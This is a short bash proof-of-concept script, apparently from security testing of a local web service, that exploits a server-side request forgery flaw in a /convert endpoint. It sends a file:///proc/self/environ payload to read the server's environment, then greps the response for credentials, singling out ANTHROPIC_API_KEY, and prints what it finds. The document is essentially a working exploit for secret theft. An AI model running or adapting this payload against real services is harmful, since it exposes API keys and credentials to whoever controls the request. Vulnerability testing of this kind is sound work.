#!/bin/bash

# POC: Environment Variable Disclosure via SSRF
# This POC demonstrates how the /convert endpoint's SSRF vulnerability
# can be exploited to read /proc/self/environ and expose sensitive
# environment variables including API keys and credentials

TARGET_URL="http://localhost:80/convert"
OUTPUT_FILE="/tmp/environ_disclosure_output.txt"

echo "[*] Testing Environment Variable Disclosure via SSRF"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: file:///proc/self/environ"
echo ""

# Make the SSRF request to read /proc/self/environ
echo "[*] Sending POST request with SSRF payload..."
curl -X POST "$TARGET_URL" \
  -d "url=file:///proc/self/environ" \
  -w "\n%{http_code}\n" \
  2>/dev/null | tee "$OUTPUT_FILE"

echo ""
echo "[*] Analyzing response..."

# Check if the response contains environment variable indicators
if grep -q "ANTHROPIC_API_KEY" "$OUTPUT_FILE" || grep -q "PATH=" "$OUTPUT_FILE" || grep -q "HOME=" "$OUTPUT_FILE"; then
    echo "[+] SUCCESS: Environment variables exposed!"
    echo ""
    echo "[+] Evidence of sensitive information disclosure:"
    
    # Extract and display environment variables
    echo "[+] Extracted environment variables:"
    grep -oE "[A-Z_]+=[^[:space:]]*" "$OUTPUT_FILE" | head -20
    echo ""
    
    # Check for API keys specifically
    if grep -q "ANTHROPIC_API_KEY" "$OUTPUT_FILE"; then
        echo "[+] CRITICAL: ANTHROPIC_API_KEY exposed!"
    fi
    
    exit 0
else
    echo "[-] No environment variables detected in response"
    echo "[-] Response may be different format or SSRF not working"
    echo ""
    echo "[*] Full response:"
    cat "$OUTPUT_FILE"
    exit 1
fi